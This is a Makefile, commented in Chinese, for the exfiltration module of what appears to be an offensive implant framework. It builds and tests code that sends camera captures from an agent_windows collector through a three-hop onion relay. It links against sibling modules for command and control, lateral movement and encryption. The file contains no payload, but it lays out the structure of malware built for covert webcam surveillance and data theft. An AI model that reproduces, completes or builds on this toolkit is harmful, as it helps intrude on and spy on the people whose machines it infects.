# 21_exfil/Makefile
#
# 采集产物回传层。
#
# 依赖（不自研第二套密码学，全部复用）：
#   14_p2p/build/libp2p.a  —— 定长信元层（底层 00_crypto 的 AES-128-GCM）
#   02_c2 / 00_crypto      —— GCM、SHA-256、HKDF、X25519
#   08_lateral             —— libp2p.a 内 relay 依赖的 poll 双工中继
#
# 依赖缺失时自动触发上游构建，不需要手工先 make 别的目录。

CC      ?= cc
CFLAGS  ?= -std=c11 -O2 -Wall -Wextra -Wpedantic -Wshadow -D_DEFAULT_SOURCE
CFLAGS  += -Iinclude -I../14_p2p/include -I../02_c2/include \
           -I../00_crypto/include -I../08_lateral/include \
           -I../agent_windows/include

BUILD   := build

P2PLIB  := ../14_p2p/build/libp2p.a
C2OBJS  := ../14_p2p/build/c2.o ../14_p2p/build/c2_frame.o \
           ../14_p2p/build/crypto_gcm.o ../14_p2p/build/crypto_hash.o \
           ../14_p2p/build/crypto_x25519.o
LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
# agent_windows 跨平台内核：采集 + JPEG 转码（端到端闭环的采集侧）
AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
           ../agent_windows/build/linux/cam_mock.o

all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit

$(BUILD):
	mkdir -p $(BUILD)

# 上游依赖缺失 -> 触发构建（幂等）
$(P2PLIB) $(C2OBJS):
	@$(MAKE) -C ../14_p2p --no-print-directory \
	  build/libp2p.a build/c2.o build/c2_frame.o \
	  build/crypto_gcm.o build/crypto_hash.o build/crypto_x25519.o

$(LATLIB):
	@$(MAKE) -C ../08_lateral --no-print-directory build/proxy.o build/lateral.o

$(AGOBJS):
	@$(MAKE) -C ../agent_windows --no-print-directory \
	  build/linux/cam_jpeg.o build/linux/cam_mock.o

$(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 回传层与已建立电路的 IO 绑定（记录 <-> fd），含短写/读满/截断判定
$(BUILD)/exfil_link.o: src/exfil_link.c include/exfil_link.h include/exfil.h | $(BUILD)
	$(CC) $(CFLAGS) -c $< -o $@

# 端到端：采集产物经**真实洋葱电路**（3 跳真进程）回传并对端重组
$(BUILD)/test_exfil_circuit: tests/test_exfil_circuit.c $(BUILD)/exfil.o $(BUILD)/exfil_link.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o $(BUILD)/exfil_link.o -o $@ \
	  $(P2PLIB) $(C2OBJS) $(LATLIB)

$(BUILD)/test_exfil: tests/test_exfil.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)

# 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
$(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)
	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB) $(AGOBJS)

test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit
	./$(BUILD)/test_exfil
	./$(BUILD)/test_cam_e2e
	./$(BUILD)/test_exfil_circuit

inspect: all
	@echo "== 21_exfil 公开符号 =="
	@nm -g --defined-only $(BUILD)/exfil.o | awk '$$2=="T"{print "  "$$3}'
	@echo "== 动态依赖 =="
	@ldd $(BUILD)/test_exfil | head -5

clean:
	rm -rf $(BUILD)

.PHONY: all test clean inspect
